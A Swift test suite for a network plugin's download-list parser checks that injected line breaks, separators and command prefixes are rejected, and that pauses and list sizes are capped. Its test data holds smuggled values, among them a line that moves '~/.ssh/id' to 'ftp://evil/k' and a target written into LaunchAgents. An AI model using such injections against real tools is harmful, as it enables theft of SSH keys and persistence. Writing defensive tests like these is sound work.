import AFMKernel
import Foundation
import TestSupport
import Testing

@testable import NetworkPlugin

/// What a download list may hold and what it says (review 2: N016, N020, N033, N070, N075).
@Suite
internal struct Review2NetworkDownloadLists {
    /// A source or target with a line break, the separator or a command's prefix is never written to a list.
    @Test
    internal func aNameWithALineBreakIsNotWritten() {
        #expect(DownloadList.canHold(source: "ftp://h/pub/a b.txt", target: "/Users/me/Downloads/a b.txt"))
        #expect(DownloadList.canHold(source: "ftp://h/a", target: nil))
        for breaker in ["\n", "\r", "\u{2028}", "\u{2029}", "\u{85}", "\u{B}", "\u{C}", "\0"] {
            #expect(
                !DownloadList.canHold(source: "ftp://h/pub/payload" + breaker + "sleep:1", target: nil),
                "\(breaker.debugDescription)"
            )
            #expect(!DownloadList.canHold(source: "ftp://h/a", target: "/t/a" + breaker + "move:/x -> ftp://evil/x"))
        }
        // The separator in a source would make its tail the target; a line that reads as a command is none.
        #expect(!DownloadList.canHold(source: "ftp://h/pub/x -> /Users/me/Library/LaunchAgents/x.plist", target: nil))
        #expect(
            !DownloadList.canHold(source: "move:/a", target: "/b")
                && !DownloadList.canHold(source: "sleep:5", target: nil)
        )
        #expect(
            !DownloadList.canHold(source: " ftp://h/a", target: nil) && !DownloadList.canHold(source: "", target: nil)
        )
    }

    /// Each line of a list is read as a download, an upload, a move, a pause or something unsupported.
    @Test
    internal func aListSaysWhatEachLineIs() {
        let actions = DownloadList.parse(
            "ftp://h/a -> /t/a\nput:/src -> ftp://h/b\nmove:~/.ssh/id -> ftp://evil/k\nsleep:999999999\nsleep:-5\nsleep:nan\nput:\n"
        )
        #expect(
            actions == [
                .download(source: "ftp://h/a", target: "/t/a"), .copy(source: "/src", target: "ftp://h/b"),
                .move(source: "~/.ssh/id", target: "ftp://evil/k"), .pause(DownloadList.longestPause), .pause(0),
                .pause(0),
                .unsupported("put:")
            ]
        )
        // No more lines than a list a person made.
        let many = String(repeating: "ftp://h/a\n", count: DownloadList.mostLines + 50)
        #expect(DownloadList.parse(many).count == DownloadList.mostLines)
    }

    /// A list file larger than the largest size, a folder or a missing file is not read.
    @Test
    internal func theFileOfAListHasALargestSize() throws {
        let box = try Sandbox()
        let small = try box.file("small.txt", "ftp://h/a\n")
        #expect(try NetworkCommands.readList(small) == "ftp://h/a\n")
        let big = box.url("big.txt")
        try Data(repeating: 0x61, count: DownloadList.largestFile + 1).write(to: big)
        #expect(throws: (any Error).self) { try NetworkCommands.readList(big) }
        #expect(throws: (any Error).self) { try NetworkCommands.readList(try box.folder("dir")) }
        #expect(throws: (any Error).self) { try NetworkCommands.readList(box.url("none.txt")) }
    }
}
